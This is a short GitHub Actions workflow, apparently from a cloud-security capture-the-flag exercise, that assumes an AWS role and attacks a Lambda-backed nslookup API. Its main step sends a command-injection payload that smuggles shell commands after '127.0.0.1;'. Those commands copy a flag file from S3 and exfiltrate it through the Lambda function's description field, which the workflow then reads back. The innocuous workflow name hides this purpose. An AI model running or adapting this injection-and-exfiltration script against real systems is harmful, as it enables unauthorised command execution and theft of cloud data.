name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda & Exfiltrate via Function Metadata

        run: |
         API_ID="3q931syi7b"
         REGION="us-east-1"
          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
    
          # Read from S3, then stuff it into the description
          PAYLOAD='{"domain": "127.0.0.1; FLAG=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1); aws lambda update-function-configuration --function-name nslookupv2 --description \"$FLAG\" --region us-east-1"}'
    
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "$PAYLOAD"
    
          sleep 6
          
          aws lambda get-function --function-name nslookupv2 \
          --query 'Configuration.Description' --output text > the_flag.txt
    
          cat the_flag.txt
